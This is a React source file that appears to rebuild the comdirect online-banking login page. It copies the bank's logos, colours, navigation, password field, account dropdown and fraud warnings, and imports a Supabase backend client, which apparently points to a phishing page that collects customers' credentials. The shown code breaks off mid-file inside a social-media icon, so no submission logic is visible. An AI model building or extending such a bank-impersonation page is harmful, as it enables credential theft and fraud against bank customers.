import { useEffect, useRef, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import teaserAsset from "@/assets/comdirect-teaser.jpg.asset.json";
import teaserMobileAsset from "@/assets/comdirect-teaser-mobile.jpg.asset.json";

const DARK = "#0B1E25";
const YELLOW = "rgb(255, 245, 0)";
const TEXT_SECONDARY = "#5a6b73";
const HEADER_MUTED = "rgb(170, 176, 179)";

const WordmarkSVG = ({ color = "#0B1E25", height = 21 }: { color?: string; height?: number }) => (
  <svg xmlns="http://www.w3.org/2000/svg" height={height} viewBox="48.478 103.112 152.304 24" aria-label="comdirect">
    <path
      fill={color}
      d="M56.978 110.6c-5.144 0-8.5 3.556-8.5 8.256 0 4.701 3.356 8.257 8.5 8.257 2.412 0 4.571-.853 6.039-2.508l-2.175-2.359c-1.029.935-2.412 1.638-3.963 1.638-2.715 0-4.772-2.062-4.772-5.027s2.058-5.03 4.772-5.03c1.551 0 2.75.591 3.878 1.622l2.26-2.343c-1.434-1.655-3.627-2.506-6.039-2.506zm16.495 0c-4.993 0-8.686 3.556-8.686 8.256 0 4.701 3.693 8.257 8.686 8.257 4.992 0 8.703-3.557 8.703-8.257-.001-4.703-3.711-8.256-8.703-8.256zm0 3.226c2.884 0 5.077 2.065 5.077 5.029 0 2.966-2.193 5.028-5.077 5.028-2.885 0-5.059-2.062-5.059-5.028-.001-2.963 2.174-5.029 5.059-5.029zm28.547-3.191c-2.108 0-3.585.752-4.748 1.812-.969-1.035-2.18-1.812-4.264-1.812-1.5 0-2.882.8-3.56 1.505v-1.152h-3.584v15.715h3.584v-11.315c.63-.729 1.599-1.411 3.077-1.411 2.132 0 3.099 1.787 3.099 4.211v8.516h3.585v-11.315c.678-.729 1.453-1.411 2.81-1.411 2.446 0 3.366 1.787 3.366 4.211v8.516h3.585v-8.021c.001-4.779-2.009-8.049-6.95-8.049m18.121-.035c-4.52 0-8.079 3.457-8.079 8.256 0 4.801 3.56 8.257 8.079 8.257 2.293 0 3.963-.902 5.076-2.293v1.883h3.524v-23.59h-3.524v9.797c-1.113-1.393-2.783-2.31-5.076-2.31zm.421 3.226c2.919 0 4.874 2.162 4.874 5.029s-1.956 5.028-4.874 5.028c-3.036 0-4.873-2.277-4.873-5.028-.001-2.751 1.836-5.029 4.873-5.029zm16.579-2.817h-3.542v15.693h3.542v-15.693zm13.037-.409c-1.974 0-3.627.688-4.688 2.179v-1.77h-3.491v15.693h3.525v-8.634c0-2.67 1.601-4.209 3.844-4.209.862 0 1.941.196 2.682.573l.844-3.391c-.811-.311-1.637-.441-2.716-.441zm11.839 0c-4.756 0-8.045 3.342-8.045 8.256 0 4.98 3.425 8.257 8.265 8.257 2.444 0 4.672-.573 6.645-2.212l-1.754-2.442c-1.332 1.033-3.053 1.655-4.673 1.655-2.293 0-4.333-1.179-4.807-3.997h11.943c.032-.394.065-.835.065-1.278-.016-4.899-3.119-8.239-7.639-8.239zm-.068 3.046c2.243 0 3.711 1.425 4.098 3.865h-8.382c.372-2.292 1.772-3.865 4.284-3.865zm18.739-3.046c-5.146 0-8.502 3.556-8.502 8.256 0 4.701 3.356 8.257 8.502 8.257 2.411 0 4.57-.853 6.037-2.508l-2.176-2.359c-1.028.935-2.411 1.638-3.963 1.638-2.715 0-4.773-2.062-4.773-5.027s2.058-5.03 4.773-5.03c1.552 0 2.75.591 3.878 1.622l2.261-2.343c-1.434-1.655-3.625-2.506-6.037-2.506zm9.333 10.419c0 4.177 2.142 6.094 5.801 6.094 2.023 0 3.659-.704 4.959-1.557l-1.4-2.735c-.962.59-2.159 1.063-3.254 1.063-1.417 0-2.564-.817-2.564-2.931v-6.832h6.189v-3.113h-6.189v-4.75h-3.541v14.761z"
    />
  </svg>
);

const CMark = ({ size = 56, color = DARK }: { size?: number; color?: string }) => (
  <svg viewBox="0 0 62 73" width={size} height={size * (73 / 62)} xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
    <path
      d="m62 10.6c-6.6-6.5-15.6-10.6-25.7-10.6-20 0-36.3 16.3-36.3 36.3s16.3 36.3 36.3 36.3c10 0 19.1-4.1 25.7-10.6l-11.2-11.2c-3.7 3.7-8.8 6-14.5 6-11.3 0-20.5-9.2-20.5-20.5s9.2-20.5 20.5-20.5c5.7 0 10.8 2.3 14.5 6z"
      fill={color}
    />
  </svg>
);

const Chevron = ({ open, color = DARK }: { open: boolean; color?: string }) => (
  <svg
    width="20"
    height="20"
    viewBox="0 0 24 24"
    fill="none"
    stroke={color}
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    style={{ transition: "transform 450ms cubic-bezier(0.4, 0, 0.2, 1), stroke 450ms ease", transform: open ? "rotate(-180deg)" : "rotate(0deg)" }}
  >
    <polyline points="6 9 12 15 18 9" />
  </svg>
);

const ButtonChevron = ({ size = 16 }: { size?: number }) => (
  <svg
    width={size}
    height={size}
    viewBox="0 0 16 16"
    fill="none"
    stroke="currentColor"
    strokeWidth="1.5"
    strokeLinecap="round"
    strokeLinejoin="round"
    aria-hidden="true"
  >
    <path d="M6 3 L11 8 L6 13" />
  </svg>
);

const SearchIcon = ({ color }: { color?: string }) => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" style={color ? { color } : undefined} aria-hidden="true">
    <path d="M17.41 14h-2.17A8 8 0 1 0 14 15.24v2.17l6 6L23.41 20ZM9 15a6 6 0 1 1 6-6 6 6 0 0 1-6 6Z" />
  </svg>
);

const WarningTriangle = () => (
  <svg width="72" height="72" viewBox="0 0 24 24" aria-hidden="true" fill="none">
    <path
      d="M12 4.2 2.5 20.4h19L12 4.2Z"
      stroke="rgb(205, 20, 35)"
      strokeWidth="1.3"
      strokeLinejoin="round"
    />
    <rect x="11.3" y="10" width="1.4" height="5" rx="0.3" fill="rgb(205, 20, 35)" />
    <circle cx="12" cy="17.2" r="0.8" fill="rgb(205, 20, 35)" />
  </svg>
);

const EyeIcon = ({ off, color = "rgb(96, 109, 113)" }: { off?: boolean; color?: string }) => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
    <path d="M1.5 12s4-7 10.5-7 10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z" />
    <circle cx="12" cy="12" r="3" />
    {off && <line x1="3" y1="21" x2="21" y2="3" />}
  </svg>
);

const FloatingInput = ({
  id,
  label,
  type = "text",
  value,
  onChange,
}: {
  id: string;
  label: string;
  type?: string;
  value: string;
  onChange: (v: string) => void;
}) => {
  const [focus, setFocus] = useState(false);
  const [hover, setHover] = useState(false);
  const [reveal, setReveal] = useState(false);
  const active = focus || value.length > 0;
  const borderColor = focus || hover ? "rgb(11, 30, 37)" : "rgb(133, 142, 146)";
  const isPassword = type === "password";
  const effectiveType = isPassword && reveal ? "text" : type;
  const showEye = isPassword && value.length > 0;
  return (
    <div
      className="relative rounded-sm bg-white h-[58px] px-3"
      style={{
        border: `1px solid ${borderColor}`,
        boxShadow: focus ? "0 0 0 1px #fff, 0 0 0 2px rgb(11, 30, 37)" : "none",
        transition: "box-shadow 150ms ease, border-color 150ms ease",
      }}
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
    >
      <label
        htmlFor={id}
        className="absolute left-3 pointer-events-none"
        style={{
          top: active ? 6 : 18,
          fontSize: active ? 12 : 15,
          color: active ? "rgb(96, 109, 113)" : "rgb(11, 30, 37)",
          transition: "top 220ms ease-in-out, font-size 220ms ease-in-out, color 220ms ease",
        }}
      >
        {label}
      </label>
      <div className="absolute left-3 right-3 top-[22px] bottom-0 flex items-center">
        <input
          id={id}
          type={effectiveType}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onFocus={() => setFocus(true)}
          onBlur={() => setFocus(false)}
          autoComplete="off"
          className="w-full h-full outline-none bg-transparent text-[15px] p-0 leading-none"
          style={{ color: DARK, paddingRight: showEye ? 28 : 0 }}
        />
        {showEye && (
          <button
            type="button"
            onMouseDown={(e) => e.preventDefault()}
            onClick={() => setReveal((r) => !r)}
            aria-label={reveal ? "Passwort verbergen" : "Passwort anzeigen"}
            className="absolute right-0 top-1/2 -translate-y-1/2 flex items-center justify-center w-6 h-6"
          >
            <EyeIcon off={reveal} />
          </button>
        )}
      </div>
    </div>
  );
};

type DirektZuItem = { value: string; label: string } | { separator: true };
const DIREKT_ZU_ITEMS: DirektZuItem[] = [
  { value: "PersoenlicherBereich", label: "Persönlicher Bereich" },
  { value: "DepotUebersicht", label: "Depotübersicht" },
  { value: "Abrechnungsdaten", label: "Abrechnungsdaten" },
  { value: "DepotUmsaetze", label: "Depotumsätze" },
  { value: "Order", label: "Order" },
  { value: "DepotOrderbuch", label: "Orderbuch" },
  { value: "KontoUmsaetze", label: "Kontoumsätze" },
  { value: "KontoUeberweisung", label: "Überweisung" },
  { separator: true },
  { value: "Musterdepot", label: "Musterdepot" },
  { value: "InformerStartseite", label: "Meine Informer Startseite" },
];

const DirektZuDropdown = ({ value, onChange }: { value: string; onChange: (v: string) => void }) => {
  const [open, setOpen] = useState(false);
  const [hover, setHover] = useState(false);
  const ref = useRef<HTMLDivElement>(null);
  const selected = DIREKT_ZU_ITEMS.find((i): i is { value: string; label: string } => "value" in i && i.value === value);
  useEffect(() => {
    if (!open) return;
    const onDown = (e: MouseEvent) => {
      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false);
    };
    const onKey = (e: KeyboardEvent) => { if (e.key === "Escape") setOpen(false); };
    document.addEventListener("mousedown", onDown);
    document.addEventListener("keydown", onKey);
    return () => {
      document.removeEventListener("mousedown", onDown);
      document.removeEventListener("keydown", onKey);
    };
  }, [open]);
  const borderColor = open || hover ? "rgb(11, 30, 37)" : "rgb(133, 142, 146)";
  return (
    <div className="relative" ref={ref}>
      <button
        type="button"
        onClick={() => setOpen((o) => !o)}
        onMouseEnter={() => setHover(true)}
        onMouseLeave={() => setHover(false)}
        className="relative w-full rounded-sm bg-white h-[58px] px-3 text-left"
        style={{
          border: `1px solid ${borderColor}`,
          boxShadow: open ? "-2px 0 0 0 rgb(11, 30, 37), 2px 0 0 0 rgb(11, 30, 37), 0 -2px 0 0 rgb(11, 30, 37)" : "none",
          transition: "box-shadow 150ms ease, border-color 150ms ease",
        }}
      >
        <span className="absolute left-3 top-[6px] text-[12px]" style={{ color: "rgb(96, 109, 113)" }}>Direkt zu</span>
        <span className="absolute left-3 right-10 top-[22px] bottom-0 flex items-center text-[15px] truncate" style={{ color: DARK }}>
          {selected?.label ?? ""}
        </span>
        <span aria-hidden className="absolute pointer-events-none" style={{ right: 40, top: 0, bottom: 0, width: 1, backgroundColor: "rgb(133, 142, 146)" }} />
        <span className="absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke={DARK} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </span>
      </button>
      {open && (
        <div
          className="dz-list absolute left-0 right-0 top-full bg-white z-20"
          style={{ border: "2px solid rgb(11, 30, 37)", borderTop: "none", marginTop: 0 }}
        >
          {DIREKT_ZU_ITEMS.map((item, idx) => {
            if ("separator" in item) {
              return (
                <div key={`sep-${idx}`} style={{ padding: "4px 12px" }}>
                  <div style={{ width: 70, borderTop: "2px dashed rgb(96, 109, 113)" }} />
                </div>
              );
            }
            const isSelected = item.value === value;
            return (
              <button
                key={item.value}
                type="button"
                onClick={() => { onChange(item.value); setOpen(false); }}
                className="dz-item w-full text-left px-3 py-1.5 text-[15px] block"
                data-selected={isSelected ? "true" : undefined}
                style={{ color: DARK }}
              >
                {item.label}
              </button>
            );
          })}
        </div>
      )}
    </div>
  );
};

const navItems: { label: string; href: string }[] = [
  { label: "Persönlicher Bereich", href: "https://www.comdirect.de/lp/wt/login" },
  { label: "Informer", href: "https://www.comdirect.de/inf/index.html" },
  { label: "Girokonto", href: "https://www.comdirect.de/konto/girokonto.html" },
  { label: "Altersvorsorge", href: "https://www.comdirect.de/altersvorsorge/altersvorsorgedepot.html" },
  { label: "Geldanlage", href: "https://www.comdirect.de/geldanlage/geldanlage.html" },
  { label: "Depot", href: "https://www.comdirect.de/depot/depot.html" },
  { label: "Wertpapierhandel", href: "https://www.comdirect.de/wertpapierhandel/wertpapierhandel.html" },
  { label: "Kredite", href: "https://www.comdirect.de/kredit/kredit.html" },
  { label: "Hilfe & Service", href: "https://www.comdirect.de/cms/hilfe-service-kontakt.html" },
];

const fraudItems = [
  {
    title: "Betrug beim mobilen Bezahlen",
    body:
      "Du wirst aufgefordert, einen Aktivierungscode oder eine TAN herauszugeben. Ziel der Kriminellen ist es, deine Debit- oder Kreditkarte auf ihrem Mobiltelefon zu hinterlegen und damit zu bezahlen.",
  },
  {
    title: "Anlagebetrug",
    body:
      "Dir wird ein hoher Gewinn mit einer angeblich sicheren Anlage versprochen. Dafür sollst du hohe Geldbeträge überweisen, die vermeintlich gewinnbringend angelegt werden.",
  },
  {
    title: "Phishing: gefälschte E-Mails und SMS",
    body:
      "Du wirst per E-Mail oder SMS aufgefordert, Links anzuklicken, Dateianhänge zu öffnen oder deine Aktivierungsgrafik für das photoTAN-Verfahren weiterzugeben – prüfe E-Mails und SMS mit Sorgfalt.",
  },
  {
    title: "Betrug in Anzeigenportalen",
    body:
      "Unbekannte Bezahlmethode? Das ist ein Trick, mit dem Kriminelle aktuell versuchen, an deine Kartendaten zu kommen.",
  },
  {
    title: "Betrug per WhatsApp: Enkeltrick",
    body:
      "Das passiert sehr häufig: Kriminelle geben vor, dein Enkel oder Kind zu sein, und bitten dich um eine Überweisung. Die Aufforderung, per WhatsApp oder E-Mail Überweisungen vorzunehmen, sollte dich immer misstrauisch machen.",
  },
];

type FLink = { label: string; href: string; external?: boolean };
const footerCols: FLink[][] = [
  [
    { label: "Kontakt", href: "https://www.comdirect.de/cms/hilfe-service-kontakt.html", external: true },
    { label: "Über uns", href: "https://www.comdirect.de/cms/ueberuns/de/unternehmen/index.html", external: true },
    { label: "Presse", href: "https://www.comdirect.de/cms/ueberuns/de/presse/presse.html", external: true },
    { label: "Magazin", href: "https://magazin.comdirect.de", external: true },
    { label: "Barrierefreiheit", href: "https://www.comdirect.de/cms/barrierefreiheit.html", external: true },
  ],
  [
    { label: "Karriere", href: "https://jobs.commerzbank.com/", external: true },
    { label: "Community", href: "https://community.comdirect.de", external: true },
    { label: "Apps", href: "https://www.comdirect.de/cms/apps.html", external: true },
    { label: "Kunden werben Kunden", href: "https://www.comdirect.de/cms/kundenwerbung.html", external: true },
  ],
  [
    { label: "Impressum", href: "https://www.comdirect.de/cms/hilfe-service-impressum.html", external: true },
    { label: "Datenschutz", href: "https://www.comdirect.de/cms/hilfe-service-sicherheit-datenschutz.html", external: true },
    { label: "Einwilligungseinstellungen", href: "#" },
    { label: "Sicherheit", href: "https://www.comdirect.de/cms/hilfe-service-sicherheit.html", external: true },
    { label: "Nutzungsbedingungen", href: "https://www.comdirect.de/cms/hilfe-service-nutzungsbedingungen.html", external: true },
    { label: "AGB", href: "https://www.comdirect.de/cms/docs/cori6762.pdf", external: true },
  ],
];

const FooterLogo = () => (
  <svg width="200" height="33" viewBox="0 0 240 40" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="comdirect">
    <path d="M75.1369 39.2662H81.1859V25.08C81.1859 22.9351 81.581 21.317 82.3806 20.2352C83.1802 19.1439 84.3467 18.5983 85.8895 18.5983C87.4323 18.5983 88.58 19.1439 89.3326 20.2352C90.0852 21.3264 90.4615 22.9257 90.4615 25.0235V39.2662H96.5104V23.1985C96.5104 21.6933 96.2658 20.3104 95.786 19.0499C95.3063 17.7893 94.6384 16.7074 93.8011 15.7949C92.9544 14.8918 91.9573 14.1769 90.8096 13.6689C89.6525 13.1609 88.4201 12.9069 87.0937 12.9069C85.4098 12.9069 83.8952 13.2926 82.5593 14.0546C81.2235 14.8166 80.1228 15.9266 79.248 17.3754C78.326 15.9266 77.216 14.8166 75.9272 14.0546C74.6384 13.2926 73.1708 12.9069 71.5151 12.9069C70.8096 12.9069 70.1511 12.9915 69.5396 13.1609C68.9281 13.3302 68.3825 13.5654 67.9027 13.8382C67.4229 14.1204 66.9996 14.4403 66.6327 14.7883C66.2658 15.1458 65.9836 15.4939 65.7578 15.8325V13.6312H59.8218V39.2568H65.8707V25.08C65.8707 22.9351 66.2376 21.317 66.9902 20.2352C67.7334 19.1439 68.8811 18.5983 70.4239 18.5983C71.9667 18.5983 73.1332 19.1439 73.9328 20.2352C74.7324 21.3264 75.1275 22.9257 75.1275 25.0235V39.2662H75.1369ZM238.42 33.5748C237.893 33.81 237.357 33.9887 236.802 34.1204C236.247 34.2521 235.701 34.3086 235.156 34.3086C234.591 34.3086 234.083 34.2239 233.613 34.064C233.152 33.904 232.757 33.6406 232.428 33.2738C232.098 32.9069 231.844 32.4365 231.666 31.8438C231.487 31.2512 231.393 30.5268 231.393 29.6519V19.0593H239.041V13.6406H231.393V5.87959H225.344V29.9812C225.344 33.396 226.153 35.9172 227.771 37.5541C229.389 39.191 231.684 40.0094 234.657 40.0094C235.692 40.0094 236.652 39.8965 237.526 39.6707C238.411 39.445 239.229 39.1533 239.991 38.8147L238.42 33.5748ZM1.04476 31.8815C1.7409 33.5372 2.70986 34.9577 3.94222 36.1618C5.17458 37.3659 6.65153 38.2973 8.35426 38.984C10.057 39.6613 11.9102 40.0094 13.914 40.0094C16.1059 40.0094 18.1285 39.6143 19.9629 38.8335C21.7973 38.0527 23.3778 36.9144 24.7042 35.428L21.1106 30.9031C20.2075 31.9191 19.1351 32.7375 17.9121 33.3678C16.6892 33.9981 15.3533 34.3086 13.9234 34.3086C12.8322 34.3086 11.8162 34.1204 10.8754 33.7347C9.9347 33.349 9.10685 32.8222 8.4107 32.1449C7.71456 31.4675 7.16894 30.6397 6.77383 29.6801C6.37872 28.7206 6.19057 27.6576 6.19057 26.4911C6.19057 25.3246 6.38813 24.2615 6.77383 23.2926C7.15953 22.3236 7.70515 21.4864 8.4107 20.7902C9.10685 20.0941 9.9347 19.5484 10.8754 19.1722C11.8162 18.7865 12.8322 18.5983 13.9234 18.5983C15.3533 18.5983 16.6798 18.9182 17.9027 19.5484C19.1163 20.1881 20.1887 21.016 21.12 22.0508L24.7136 17.5353C23.3872 16.0677 21.8068 14.9294 19.9723 14.1204C18.1379 13.3114 16.1247 12.9069 13.9234 12.9069C11.929 12.9069 10.0758 13.2549 8.36367 13.9417C6.65153 14.6284 5.18399 15.5785 3.95163 16.7921C2.71927 17.9962 1.75031 19.4356 1.05417 21.0913C0.358023 22.7564 0.00995132 24.5532 0.00995132 26.5005C0.000543979 28.4384 0.348618 30.2352 1.04476 31.8815ZM35.7861 13.9417C34.0927 14.6284 32.644 15.588 31.4116 16.8015C30.1887 18.0151 29.2291 19.445 28.5424 21.0913C27.8557 22.7375 27.5076 24.5155 27.5076 26.444C27.5076 28.3725 27.8557 30.1599 28.5424 31.8062C29.2291 33.4619 30.1887 34.8918 31.4116 36.1054C32.6346 37.3189 34.0927 38.2785 35.7861 38.9652C37.47 39.6519 39.3044 40 41.2894 40C43.2649 40 45.0993 39.6519 46.7738 38.9652C48.4577 38.2785 49.9065 37.3189 51.1482 36.1054C52.3806 34.8918 53.3496 33.4525 54.0457 31.8062C54.7418 30.1505 55.0899 28.3631 55.0899 26.444C55.0899 24.5155 54.7418 22.7375 54.0457 21.0913C53.3496 19.445 52.3806 18.0151 51.1482 16.8015C49.9159 15.588 48.4577 14.6284 46.7738 13.9417C45.0899 13.2549 43.2649 12.9069 41.2894 12.9069C39.3044 12.9069 37.47 13.2455 35.7861 13.9417ZM38.2037 33.7347C37.2818 33.349 36.4822 32.8222 35.8049 32.1261C35.137 31.4393 34.6101 30.6115 34.2433 29.6519C33.867 28.6924 33.6882 27.6199 33.6882 26.4346C33.6882 25.2681 33.8764 24.2145 34.2621 23.2455C34.6478 22.286 35.1746 21.4581 35.8425 20.7714C36.5104 20.0847 37.31 19.5484 38.2414 19.1627C39.1727 18.777 40.1887 18.5889 41.2894 18.5889C42.3994 18.5889 43.4154 18.777 44.3561 19.1627C45.2969 19.5484 46.0965 20.0753 46.7644 20.7714C47.4323 21.4581 47.9592 22.286 48.3449 23.2455C48.7306 24.2051 48.9187 25.2681 48.9187 26.4346C48.9187 27.6105 48.7306 28.683 48.3449 29.6519C47.9686 30.6115 47.4417 31.4393 46.7644 32.1261C46.0965 32.8128 45.2875 33.349 44.3561 33.7347C43.4248 34.111 42.3994 34.3086 41.2894 34.3086C40.1605 34.3086 39.1351 34.1204 38.2037 33.7347ZM128.1 0H122.051V16.5287C121.233 15.3998 120.17 14.5155 118.853 13.8758C117.536 13.2267 115.984 12.9069 114.187 12.9069C112.371 12.9069 110.687 13.2455 109.144 13.9323C107.602 14.619 106.266 15.5503 105.128 16.7545C103.989 17.9492 103.105 19.3791 102.475 21.0254C101.835 22.6811 101.525 24.4873 101.525 26.444C101.525 28.4007 101.844 30.2164 102.475 31.8721C103.114 33.5372 103.999 34.9671 105.128 36.1618C106.266 37.3565 107.602 38.2973 109.144 38.984C110.687 39.6613 112.371 40.0094 114.187 40.0094C116.002 40.0094 117.573 39.699 118.9 39.0687C120.226 38.4478 121.28 37.5541 122.061 36.4158V39.2756H128.11V0H128.1ZM111.901 33.6971C110.998 33.2926 110.226 32.7281 109.596 32.0132C108.966 31.2982 108.495 30.461 108.176 29.5108C107.856 28.5607 107.696 27.5353 107.696 26.444C107.696 25.3528 107.856 24.3368 108.176 23.3772C108.495 22.4271 108.966 21.5898 109.596 20.8843C110.226 20.1787 110.988 19.6143 111.901 19.2098C112.813 18.8053 113.848 18.5983 115.033 18.5983C116.144 18.5983 117.141 18.7959 118.044 19.1816C118.947 19.5767 119.709 20.1129 120.349 20.8184C120.988 21.5146 121.468 22.3424 121.807 23.2926C122.145 24.2427 122.305 25.2963 122.305 26.4346C122.305 27.5259 122.136 28.5513 121.807 29.5108C121.468 30.4704 120.988 31.3076 120.349 32.0132C119.709 32.7187 118.947 33.2832 118.044 33.6877C117.141 34.0922 116.144 34.2992 115.033 34.2992C113.848 34.3086 112.804 34.1016 111.901 33.6971ZM174.29 13.8946C172.729 14.5626 171.383 15.4845 170.245 16.6698C169.107 17.8551 168.232 19.285 167.602 20.9407C166.971 22.5964 166.661 24.4309 166.661 26.4252C166.661 28.4572 166.99 30.3104 167.639 31.9755C168.288 33.65 169.201 35.0705 170.358 36.2559C171.525 37.4318 172.907 38.3537 174.516 39.0028C176.125 39.6519 177.884 39.9812 179.812 39.9812C181.788 39.9812 183.669 39.7084 185.438 39.1533C187.207 38.5983 188.872 37.667 190.433 36.3594L187.602 31.8626C186.529 32.7187 185.344 33.3866 184.046 33.8758C182.747 34.365 181.459 34.6096 180.189 34.6096C179.314 34.6096 178.467 34.4967 177.639 34.2709C176.811 34.0452 176.078 33.6877 175.419 33.2079C174.761 32.7281 174.224 32.1072 173.782 31.3547C173.35 30.6021 173.077 29.7084 172.964 28.6736H191.459C191.515 28.3255 191.553 27.9586 191.581 27.5541C191.609 27.1496 191.619 26.7733 191.619 26.4064C191.619 24.412 191.318 22.5776 190.715 20.9219C190.113 19.2568 189.286 17.8363 188.213 16.651C187.141 15.4657 185.861 14.5343 184.375 13.8758C182.889 13.2173 181.242 12.8786 179.446 12.8786C177.573 12.9069 175.852 13.2361 174.29 13.8946ZM172.983 24.1204C173.096 23.302 173.303 22.54 173.622 21.8344C173.942 21.1289 174.366 20.5174 174.902 20.0094C175.438 19.5014 176.078 19.0969 176.821 18.8147C177.564 18.523 178.42 18.3819 179.38 18.3819C180.255 18.3819 181.045 18.5325 181.75 18.8147C182.456 19.1063 183.077 19.5014 183.613 20.0094C184.149 20.5174 184.572 21.1195 184.892 21.8156C185.212 22.5118 185.419 23.2832 185.504 24.1204H172.983ZM156.661 13.7912C155.419 14.3838 154.413 15.3528 153.651 16.6886V13.6406H147.686V39.2662H153.735V25.2399C153.735 24.1863 153.876 23.2455 154.159 22.4177C154.441 21.5898 154.836 20.8937 155.353 20.3199C155.871 19.746 156.492 19.3133 157.207 19.031C157.922 18.7394 158.721 18.5983 159.587 18.5983C160.273 18.5983 161.007 18.6736 161.788 18.8335C162.569 18.9934 163.255 19.2192 163.858 19.5296L165.165 13.7065C164.525 13.4525 163.867 13.2549 163.19 13.1232C162.512 12.9821 161.731 12.9163 160.866 12.9163C159.304 12.9069 157.903 13.1985 156.661 13.7912ZM140.96 13.6406H134.911V39.2662H140.96V13.6406ZM196.802 31.8815C197.498 33.5372 198.467 34.9577 199.7 36.1618C200.932 37.3659 202.409 38.2973 204.112 38.984C205.814 39.6613 207.668 40.0094 209.671 40.0094C211.863 40.0094 213.886 39.6143 215.72 38.8335C217.555 38.0527 219.135 36.9144 220.461 35.428L216.868 30.9031C215.955 31.9191 214.892 32.7375 213.669 33.3678C212.446 33.9981 211.111 34.3086 209.681 34.3086C208.589 34.3086 207.573 34.1204 206.633 33.7347C205.692 33.349 204.864 32.8222 204.168 32.1449C203.472 31.4675 202.926 30.6397 202.531 29.6801C202.145 28.7206 201.948 27.6576 201.948 26.4911C201.948 25.3246 202.145 24.2615 202.531 23.2926C202.926 22.3236 203.462 21.4864 204.168 20.7902C204.864 20.0941 205.692 19.5484 206.633 19.1722C207.573 18.7865 208.589 18.5983 209.681 18.5983C211.111 18.5983 212.437 18.9182 213.66 19.5484C214.874 20.1881 215.946 21.016 216.877 22.0508L220.471 17.5353C219.144 16.0677 217.564 14.9294 215.73 14.1204C213.895 13.3114 211.882 12.9069 209.681 12.9069C207.686 12.9069 205.833 13.2549 204.121 13.9417C202.418 14.6284 200.941 15.5785 199.709 16.7921C198.477 17.9962 197.508 19.4356 196.811 21.0913C196.115 22.7564 195.758 24.5532 195.758 26.5005C195.748 28.4384 196.096 30.2352 196.802 31.8815Z" fill="#FFF500" />
  </svg>
);

const FooterShapeLeft = () => (
  <svg aria-hidden="true" width="180" height="240" viewBox="208 38 180 240" xmlns="http://www.w3.org/2000/svg">
    <path clipRule="evenodd" d="m328 158c33.1 0 60-26.9 60-60s-26.9-60-60-60-60 26.9-60 60 26.9 60 60 60zm0-30c16.6 0 30-13.4 30-30s-13.4-30-30-30-30 13.4-30 30 13.4 30 30 30z" fill="#27343a" fillRule="evenodd" />
    <g fill="#3f4b50">
      <circle cx="298" cy="188" r="30" />
      <circle cx="298" cy="248" r="30" />
      <circle cx="238" cy="248" r="30" />
      <circle cx="238" cy="188" r="30" />
    </g>
  </svg>
);

const FooterShapeRight = () => (
  <svg aria-hidden="true" width="210" height="120" viewBox="1532 64 210 120" xmlns="http://www.w3.org/2000/svg">
    <path d="m1592 184v-30c-16.6 0-30-13.4-30-30s13.4-30 30-30v-30c-33.1 0-60 26.9-60 60s26.9 60 60 60z" fill="#27343a" />
    <path d="m1742 184h-120c33.1 0 60-26.9 60-60s-26.9-60-60-60h120z" fill="#27343a" />
    <path d="m1592 154c16.6 0 30-13.4 30-30s-13.4-30-30-30z" fill="#fff500" />
  </svg>
);

const SocialIcons = () => (
  <div className="flex gap-7 items-center" style={{ color: "#e5e7e8" }}>

    <a href="https://www.facebook.com/comdirect" target="_blank" rel="noopener noreferrer" aria-label="Social Link zu Facebook" className="transition-colors hover:text-[rgb(255,245,0)]">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
        <path d="m24 12.1c0-6.6-5.4-12-12-12s-12 5.3-12 12c0 6 4.4 11 10.1 11.9v-8.4h-3v-3.5h3v-2.7c0-3 1.8-4.7 4.5-4.7 1.4.1 2.7.3 2.7.3v3h-1.5c-1.5 0-2 .9-2 1.9v2.2h3.3l-.5 3.5h-2.8v8.4c5.8-1 10.2-5.9 10.2-11.9z" />
      </svg>
    </a>
    <a href="https://www.youtube.com/comdirect" target="_blank" rel="noopener noreferrer" aria-label="Social Link zu YouTube" className="transition-colors hover:text-[rgb(255,245,0)]">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
        <path d="m23.5 6.2c-.1-.5-.4-1-.8-1.4s-.8-.6-1.3-.8c-1.9-.5-9.4-.5-9.4-.5s-7.5 0-9.4.5c-.5.1-1 .4-1.3.8-.4.4-.7.9-.8 1.4-.5 1.9-.5 5.8-.5 5.8s0 3.9.5 5.8c.1.5.4 1 .8 1.4s.8.6 1.3.8c1.9.5 9.4.5 9.4.5s7.5 0 9.4-.5c.5-.1 1-.4 1.3-.8s.6-.8.8-1.4c.5-1.9.5-5.8.5-5.8s0-3.9-.5-5.8zm-14 9.4v-7.2l6.3 3.6z" />
      </svg>
    </a>
    <a href="https://www.instagram.com/comdirect/?hl=de" target="_blank" rel="noopener noreferrer" aria-label="Social Link zu Instagram" className="transition-colors hover:text-[rgb(255,245,0)]">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
